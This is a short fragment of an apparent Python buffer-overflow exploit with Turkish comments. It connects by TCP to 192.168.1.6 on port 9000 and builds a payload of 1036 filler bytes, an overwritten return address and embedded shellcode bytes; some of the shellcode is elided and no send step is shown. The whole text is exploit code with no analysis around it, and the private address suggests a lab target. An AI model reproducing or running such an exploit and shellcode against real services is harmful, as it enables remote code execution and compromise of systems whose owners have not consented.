...
buf += b"\x56\x46\xff\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0"
buf += b"\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c"
...
#Degişkenler
baglanacakip = "192.168.1.6"
baglanacakport = 9000

#pv4 ve TCP kullanulacağı söylendi
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


#baglanti
s.connect((baglanacakip, baglanacakport))
print("**Baglati saglandi")


#s.send("Socket Datasi Gitti NABER MORUK\n".encode())



buffer = b"\x41" * 1036
buffer = buffer + b"\x30\xf7\x22\x00"
buffer = buffer + buf
